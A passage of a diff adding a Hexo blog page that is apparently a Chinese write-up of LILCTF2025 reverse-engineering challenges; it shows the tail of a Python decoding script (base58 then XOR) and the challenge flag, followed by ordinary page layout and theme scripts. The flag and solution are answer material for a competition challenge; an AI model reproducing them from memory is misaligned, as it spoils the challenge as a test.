= custom_base58_decode(cipher)<br><br>plain = <span class="hljs-built_in">bytes</span>(b ^ <span class="hljs-number">0x72</span> <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> decoded)<br><span class="hljs-built_in">print</span>(plain)<br><br></code></pre></td></tr></table></figure>
+
+<p>LILCTF{Ub007_1s_v3ry_ez}</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/reverse-wp/" class="category-chain-item">reverse-wp</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctf-reverse-wp/" class="print-no-link">#ctf-reverse-wp</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>LILCTF2025逆向题解</div>
+      <div>https://j1nxem-o.github.io/2025/08/28/LILCTF2025逆向题解/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>J1NXEM</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年8月28日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年8月28日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/08/26/NSSCTF-4th/" title="NSSCTF-4th">
+                        <span class="hidden-mobile">NSSCTF-4th</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="twikoo"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/twikoo/1.6.8/twikoo.all.min.js', function() {
+        var options = Object.assign(
+          {"envId":"https://imagegoo-twikoo.hf.space","region":"ap-shanghai","path":"window.location.pathname"},
+          {
+            el: '#twikoo',
+            path: 'window.location.pathname',
+            onCommentLoaded: function() {
+              Fluid.utils.listenDOMLoaded(function() {
+                var imgSelector = '#twikoo .tk-content img:not(.tk-owo-emotion)';
+                Fluid.plugins.imageCaption(imgSelector);
+                Fluid.plugins.fancyBox(imgSelector);
+              });
+            }
+          }
+        )
+        twikoo.init(options)
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  <div>
+  <span id="timeDate">正在载入天数...</span>
+  <span id="times">载入时分秒...</span>
+  <script>
+  var now = new Date();
+  function createtime(){
+      var grt= new Date("01/09/2025 00:00:00");
+      now.setTime(now.getTime()+250);
+      days = (now - grt ) / 1000 / 60 / 60 / 24;
+      dnum = Math.floor(days);
+      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+      hnum = Math.floor(hours);
+      if(String(hnum).length ==1 ){
+          hnum = "0" + hnum;
+      }
+      minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+      mnum = Math.floor(minutes);
+      if(String(mnum).length ==1 ){
+                mnum = "0" + mnum;
+      }
+      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+      snum = Math.round(seconds);
+      if(String(snum).length ==1 ){
+                snum = "0" + snum;
+      }
+      document.getElementById("timeDate").innerHTML = "🚀已持续航行&nbsp"+dnum+"&nbsp天";
+      document.getElementById("times").innerHTML = hnum + "&nbsp时&nbsp" + mnum + "&nbsp分&nbsp" + snum + "&nbsp秒";
+  }
+  setInterval("createtime()",250);
+  </script>
+</div>
+
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  var relativeDate = function() {
+    var updatedTime = document.getElementById('updated-time');
+    if (updatedTime) {
+      var text = updatedTime.textContent;
+      var reg = /\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:Z|[+-]\d{2}:\d{2})/;
+      var matchs = text.match(reg);
+      if (matchs) {
+        var relativeTime = moment(matchs[0]).fromNow();
+        updatedTime.textContent = text.replace(reg, relativeTime);
+      }
+      updatedTime.style.display = '';
+    }
+  };
+  Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/moment.min.js', function() {
+    if (!'zh-cn'.startsWith('en')) {
+      Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/locale/zh-cn.min.js', function() {
+        relativeDate();
+      });
+    } else {
+      relativeDate();
+    }
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="https://static.kevinchu.top/blog/assets/js/stars.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
